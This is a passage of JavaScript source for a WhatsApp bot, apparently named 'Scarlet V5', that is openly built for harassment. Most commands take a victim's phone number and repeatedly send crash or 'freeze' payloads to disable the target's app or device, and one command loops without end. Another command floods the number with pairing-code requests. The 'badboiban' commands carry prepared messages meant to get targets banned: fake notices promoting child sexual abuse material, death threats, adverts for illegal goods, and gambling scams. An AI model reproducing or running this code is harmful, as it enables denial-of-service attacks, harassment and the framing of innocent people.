for (let i = 0; i < 30; i++) {
await freezeui(target, true)
await freezeuii(target, true)
await nulltag(target, true)
await Bug1(target, Null)
await Bug2(target, Null)
await InfiNite(target, cct = true, ptcp = true)
await InfiNite(target, cct = true, ptcp = true)
await InfiNite(target, cct = true, ptcp = true)
}
reply("TARGET CRASHED")
}
case 'xbug': 

if (!isOwner) return reply("NO ACCESS")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 234×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; ; i++) {
await func1(target);
await ngeloc(target);
await killui(target);
await func1(target);
await ngeloc(target);
await killui(target);
await func1(target);
await ngeloc(target);
await killui(target);
await DocBug(target)
}
break
case 'Scarletcrash': 

     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© Scarlet 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
case 'byypas': 

     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: NewBug
© Scarlet 
 `)
     for (let i = 0; i < 9; i++) {
    await CallMsg(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: NewBug
 `)
 break
 case 'clearbugs': {
 

if (!isOwner) return reply("NO ACCESS")
if (!q) return m.reply(`Example:\n ${prefix + command} 234xxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
bad.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug ")
}
break 
 case 'Scarletfreeze': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© Scarlet 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
 case '🔥': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 🔥
© Scarlet 
 `)
     for (let i = 0; i < 9; i++) {
    await CaroUsel(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: ❤️‍🔥
 `)
 break
 case 'hardbug': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: hardbug
© Scarlet 
 `)
     for (let i = 0; i < 9; i++) {
    await XeonXRobust(zLoc, ptcp = true)
    await xeonHARD(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await newsLetter(zLoc, ptcp = true)   
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: hardbug
 `)
 break
 case '😈': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 😈
© Scarlet 
 `)
     for (let i = 0; i < 10; i++) {
    await Gsz(zLoc, Ptcp = true)
    await xPokers(zLoc, Ptcp = true)
    await uidoc2(zLoc, ptcp = false)
    await freezefile(zLoc, ptcp = false)
    await CaroUsel(zLoc, ptcp = false)
    await NullX(zLoc, ptcp = false)
    await Vulcanicx(zLoc, ptcp = false)
    await xTravas(zLoc, ptcp = false)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 😈
 `)
 break
case '🦅': 

     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: 🦅
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 🦅
 `)
 case 'killsystemui':
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
 case 'blankwhatsapp': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
case 'mediumbug':
 

if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: mediumbug
 `)
     for (let i = 0; i < 5; i++) {
    await SletterCrash(zLoc, ptcp = true)
    await freezefile(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: mediumbug
 `)
 break
case 'combobug':

     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Bug Combo 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await TanggapanDiterima(zLoc, ptcp = true)
    await VPen(zLoc, ptcp = true)
    await BlankInvite(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Bug Combo
 `)
 break
 case 'iphonecrasher': 
 
 
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'lockios':
 

if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'killaccess': 
 

if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Kill iPhone Access
 `)
     for (let i = 0; i < 5; i++) {
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Kill iPhone Access
 `)
 break
 case 'locationbug': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Location Bug
 `)
     for (let i = 0; i < 9; i++) {
    await liveLokFreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Location Bug
 `)
 break
 case 'documentbug': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Document Bug
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Document Bug
 `)
 break
case 'pairing': 
 
     
if (!isOwner) return reply("NO ACCESS")
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 234x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: pairing
 `)
     for (let i = 0; i < 9; i++) {
    await SendPairing(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: pairing
 `)
break
    case 'totalcase': {
    
    const totalFitur = () => {
        const mytext = fs.readFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js").toString();
        const numUpper = (mytext.match(/case '/g) || []).length;
        return numUpper;
    };

    const videoUrl = 'https://files.catbox.moe/247ucr.mp4'; // URL video yang ingin digunakan

    let teks = `
┌───「 *SCARLET V5* 」───
│ ⚙️ *Total Features*: ${totalFitur()}
│ 🛠️ *Developer*: King badboi and king pussy
└───────────────────
`;

    await bad.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: teks,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5',
                body: 'Simple Bot WhatsApp.',
                mediaType: 1,
                renderLargerThumbnail: false,
            },
        },
    }, { quoted: m });
}
// TOOL ABAL"
break
//==================≠==========≠===========≠//
case 'badboiban4':{

await loading()
let kimg=`Привет, пользователи, мы из компании Whatsapp, мы заметили, что вы продаете порнографию в Whatsapp meta Марк Цукерберг, я советую вам продавать всю детскую обнаженную натуру компании Whatsapp, и простой способ заработать деньги заключается в том, что вы можете делиться детской порнографией на всех платформах meta, таких как Whatsapp, Instagram и Facebook. сделав это , вы будете вознаграждены этим человеком большой суммой денег.
https://api.whatsapp.com/send?phone=`
bad.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5`,
                            body: `© 🇳🇬𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄`,
                            thumbnailUrl: `https://files.catbox.moe/qxbobz.jpeg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VadCyFZGufJ2YW4bG42x`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'badboiban5':{

await loading()
let kimg=`ALEGRE! Slots Gacor confiáveis e lucrativos no Brasil!

⏳site de apostas confiável que possui usuários conhecidos e muitos bônus diários.
🎁se você for um novo usuário e fizer um depósito de US$ 10 a US$ 50, você receberá um bônus de 24$ por três dias consecutivos. 70% dos usuários do nosso site de slots se tornaram bilionários desde que se resamraram em nosso site há algumas semanas🥳. porque nosso administrador forneceu instruções para que novos usuários possam entender quando jogar e prestar assistência para que possam ganhar muito dinheiro em apenas alguns dias🌤️.
Nosso site possui muitos jogos para que todos os usuários não se sintam entediados. Nós, como administradores, oferecemos um bônus em dinheiro de US$ 10 para aqueles que convidaram suas famílias para jogar em nosso site🥳🤩
Você está interessado em jogar em nosso site de caça-níqueis, que atualmente é o mais popular do Brasil? Se quiser jogar você pode acessar nosso site de slots abaixo:
https://paficrb.com/slotgacor/
Se você, como usuário, deseja pedir ajuda ao jogar em nosso site, pode entrar em contato com nosso administrador através do número de WhatsApp abaixo 👇👇👇
https://api.whatsapp.com/send?phone=`
bad.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5`,
                            body: `© 🇳🇬𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄`,
                            thumbnailUrl: `https://files.catbox.moe/qxbobz.jpeg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VadCyFZGufJ2YW4bG42x`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'badboiban6':{

await loading()
let kimg=`ðŸ”¥ O site do casino que esteve fechado durante muito tempo estÃ¡ de volta ðŸ”¥
ðŸš€ foi atualizado. um site de casino que jÃ¡ chocou o Brasil porque este site jÃ¡ pagou R$ 900,000,000,00 reais!! 
â° Os novos utilizadores que se resamarem e depositarem 50â‚¬ ganharÃ£o uma mÃ¡quina de jogos grÃ¡tis, apenas para as 10 pessoas mais rÃ¡pidas!! serÃ¡ invÃ¡lido em 3 dias. 
ðŸŽ Primeiro BÃ³nus: 100% do primeiro depÃ³sito atÃ© 300â‚¬ e 30 rotaÃ§Ãµes livres.
Segundo BÃ³nus: 50% do segundo depÃ³sito atÃ© 350â‚¬ e 35 rotaÃ§Ãµes livres.
ðŸŽ‰ 100% no primeiro depÃ³sito atÃ© mais de R$ 1.200 Ã© apenas para utilizadores que queiram partilhar o link fornecido pelo administrador, basta partilhar em vÃ¡rias aplicaÃ§Ãµes como WhatsApp, Instagram, Telegram. 

ðŸª­melhor site do momentoðŸª­
https://1xbet1.com.br/

ðŸ“ž contacte o administrador para solicitar link caso pretenda ganhar 1.200â‚¬; https://web.whatsapp.com/telefone/send?phone=`
bad.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5`,
                            body: `© 🇳🇬𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄`,
                            thumbnailUrl: `https://files.catbox.moe/qxbobz.jpeg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VadCyFZGufJ2YW4bG42x`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break 
case 'totalcase':
              {
                //inireact();
                
if (!isOwner) return reply("Special Features for Certain Users!!")
                (penis = fs.readFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js").toString()),
                  (matches =
                    penis.match(/case '[^']+'(?!.*case '[^']+')/g) || []),
                  (caseCount = matches.length),
                  (caseNames = matches.map(
                    (match) => match.match(/case '([^']+)'/)[1]
                  ));

                let totalCases = caseCount,
                  listCases = caseNames.join("\n• ");

                reply(
                  `Total case: ${totalCases}\n\n• ${
                    totalCases > 0 ? listCases : "No cases found."
                  }`
                );
              }
break
case 'ping': case 'speed': { 

await loading()
let timestamp = speed()
let latensi = speed() - timestamp

         m.reply (`━━━━━━━━━━━━━━━━━\n\◉ 𝙷𝙴𝙻𝙻𝙾 ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5  𝚂𝙿𝙴𝙴𝙳   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
 await sleep(2000)

await bad.sendMessage(m.chat, {

audio: darkphonk,

mimetype: 'audio/mpeg'

}, { quoted: extd

})

}
break
case 'spampair': {
 
const usePairingCode = true
const resolveMsgBuffer = new NodeCache()
			 
                if (!isOwner) return
			if (!q) return m.reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 234xx`) 
			let [peenis, pepekk = "20"] = q.split("|")
			await m.reply(`</> SUCCESSFULLY SPAMMING CODES`)
			await bad.sendMessage(m.chat, { react: { text: `💫`, key: m.key }})
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('pairspam')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
version: [2, 2413, 1],
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
generateHighQualityLinkPreview: true,
resolveMsgBuffer,
				logger: pino({ level: "silent" }),
					level: 'fatal'
				})
			for (let i = 0; i < pepekk; i++) {
			await sleep(2000)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`Success Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(2000)
		}
break
      case 'getdevice':
      
        if (m.message.extendedTextMessage) {
          const repliedMessage = m.message.extendedTextMessage.contextInfo;
          const repliedJid = repliedMessage.participant;

          try {
            const deviceInfo = await bad.getDevice(repliedJid);
            const os = deviceInfo.os;
            const device = deviceInfo.device;
            const browser = deviceInfo.browser;
            const platform = deviceInfo.platform;

            let deviceString = '';
            if (os) deviceString += `OS: ${os}\n`;
            if (device) deviceString += `Device: ${device}\n`;
            if (browser) deviceString += `Browser: ${browser}\n`;
            if (platform) deviceString += `Platform: ${platform}\n`;

            bad.sendMessage(sender, `Device info for ${repliedJid}:\n${deviceString}`);
          } catch (error) {
            bad.sendMessage(sender, 'Failed to retrieve device info');
          }
        } else {
          bad.sendMessage(sender, 'Please reply to a message to get device info');
        }         
break
case 'dec':
case 'decrypt': {

if (!isOwner) return reply("Special Features for Certain Users!!")
    await bad.sendMessage(m.chat, { react: { text: "👑️", key: m.key } });
    
    const { webcrack } = await import('webcrack');
    const usage = `Example:\n${command} (Input text or reply text to dec code)\n${command} doc (Reply to a document)`;

    // Ensure only the owner can use this command
    if (!isOwner) return reply('*What are you doing bro? Want to Rent a Decrypt Bot? Just pm 2348140825959, guaranteed lots of interesting features*');

    let text;
    
    // Determine text to decrypt
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return reply(usage);
    }

    try {
        let message;

        // Decrypt document if command is "doc"
        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;

            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
                message = await webcrack(docBuffer.toString('utf-8'));
            } else {
                return reply("Invalid document format.");
            }
        } else {
            // Decrypt regular text
            message = await webcrack(text);
        }

        // Save the decrypted content to file
        const filePath = './@𝐃𝐞𝐜𝐫𝐲𝐩𝐭 𝐁𝐲 ©👑𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄 👑.js';
        fs.writeFileSync(filePath, message.code || message);

        // Send the decrypted file
        await bad.sendMessage(m.chat, {
            document: { url: filePath },
            mimetype: 'application/javascript',
            fileName: '𝐃𝐞𝐜𝐫𝐲𝐩𝐭 𝐁𝐲 ©👑𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄 👑🎭.js'
        }, { quoted: m });

    } catch (error) {
        const errorMessage = `There is an error: ${error.message}`;
        await reply(errorMessage);
    }
}
  break;
            case "sound1":
            case "sound2":
            case "sound3":
            case "sound4":
            case "sound5":
            case "sound6":
            case "sound7":
            case "sound8":
            case "sound9":
            case "sound10":
            case "sound11":
            case "sound12":
            case "sound13":
            case "sound14":
            case "sound15":
            case "sound16":
            case "sound17":
            case "sound18":
            case "sound19":
            case "sound20":
            case "sound21":
            case "sound22":
            case "sound23":
            case "sound24":
            case "sound25":
            case "sound26":
            case "sound27":
            case "sound28":
            case "sound29":
            case "sound30":
            case "sound31":
            case "sound32":
            case "sound33":
            case "sound34":
            case "sound35":
            case "sound36":
            case "sound37":
            case "sound38":
            case "sound39":
            case "sound40":
            case "sound41":
            case "sound42":
            case "sound43":
            case "sound44":
            case "sound45":
            case "sound46":
            case "sound47":
            case "sound48":
            case "sound49":
            case "sound50":
            case "sound51":
            case "sound52":
            case "sound53":
            case "sound54":
            case "sound55":
            case "sound56":
            case "sound57":
            case "sound58":
            case "sound59":
            case "sound60":
            case "sound61":
            case "sound62":
            case "sound63":
            case "sound64":
            case "sound65":
            case "sound66":
            case "sound67":
            case "sound68":
            case "sound69":
            case "sound70":
            case "sound71":
            case "sound72":
            case "sound73":
            case "sound74":
            case "sound75":
            case "sound76":
            case "sound77":
            case "sound78":
            case "sound79":
            case "sound80":
            case "sound81":
            case "sound82":
            case "sound83":
            case "sound84":
            case "sound85":
            case "sound86":
            case "sound87":
            case "sound88":
            case "sound89":
            case "sound90":
            case "sound91":
            case "sound92":
            case "sound93":
            case "sound94":
            case "sound95":
            case "sound96":
            case "sound97":
            case "sound98":
            case "sound99":
            case "sound100":
            case "sound101":
            case "sound102":
            case "sound103":
            case "sound104":
            case "sound105":
            case "sound106":
            case "sound107":
            case "sound108":
            case "sound109":
            case "sound110":
            case "sound111":
            case "sound112":
            case "sound113":
            case "sound114":
            case "sound115":
            case "sound116":
            case "sound117":
            case "sound118":
            case "sound119":
            case "sound120":
            case "sound121":
            case "sound122":
            case "sound123":
            case "sound124":
            case "sound125":
            case "sound126":
            case "sound127":
            case "sound128":
            case "sound129":
            case "sound130":
            case "sound131":
            case "sound132":
            case "sound133":
            case "sound134":
            case "sound135":
            case "sound136":
            case "sound137":
            case "sound138":
            case "sound139":
            case "sound140":
            case "sound141":
            case "sound142":
            case "sound143":
            case "sound144":
            case "sound145":
            case "sound146":
            case "sound147":
            case "sound148":
            case "sound149":
            case "sound150":
            case "sound151":
            case "sound152":
            case "sound153":
            case "sound154":
            case "sound155":
            case "sound156":
            case "sound157":
            case "sound158":
            case "sound159":
            case "sound160":
            case "sound161":
            
            await loading()
                XeonBotInc_dev = await getBuffer(
                    `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
                );
                await bad.sendMessage(
                    m.chat,
                    {
                        audio: XeonBotInc_dev, mimetype: "audio/mp4", ptt: true
                    },
                    {
                        quoted: m
                    }
                );
break
                        case 'badboiban1':{
                        
                        await loading()
               
if (!isOwner) return reply("Special Features for Certain Users!!")
                        const mtban1 = `Hello, I'm Ditzz Zuckerberg, I'm a terrorist from Indonesia, I'm going to kill you in the United States (USA), aiming for your head Mark Zuckerberg 👿, if you don't want to be killed then you have to contact me via the WhatsApp app 🔪👇
                        https: //api.whatsapp.com/send?phone=+234`
                        await reply(mtban1);
                    }
                    break;
                                case "opay":
                                case "donasi":
                                
                                await loading()
                                    let textnate = `Hello Brother \n\nNo matter how much you donate is very valuable for us`;
                                    bad.sendMessage(
                                        m.chat,
                                        {
                                            text:
                                            "opay: 8140825959-alaba-adebisi-adeboyejo" + textnate
                                        },
                                        {
                                            quoted: m
                                        }
                                    );
                    break
                case 'badboiban3': {
                
                await loading()
               
if (!isOwner) return reply("Special Features for Certain Users!!")
                        const mtban2 = `Hello, I am the terrorist who received orders from Ditzz Zuckerberg, to kill you Mark Zuckerberg 🔪👿.
                        https://api.whatsapp.com/send?phone=+234`
                        await reply(mtban2);
                    } 
                    break;
                case "badboiban2": {
                
                await loading()
               
if (!isOwner) return reply("Special Features for Certain Users!!")
                        const mtban3 = `I sell illegal items such as 👇
                        Drugs
                        Firearms
                        Human organs 👿
                        Woman's vagina
                        Porn video 🔞
                        Sexual children 👿

                        If you want to order, contact me on WhatsApp 👿👇
                        https://api.whatsapp.com/send?phone=+234`
                        await reply(mtban3);
                    }
                    break;
                                case 'buypremium':
                                case 'buyprem':
                                case 'premium':
                                    {
                                    
                                        await loading()
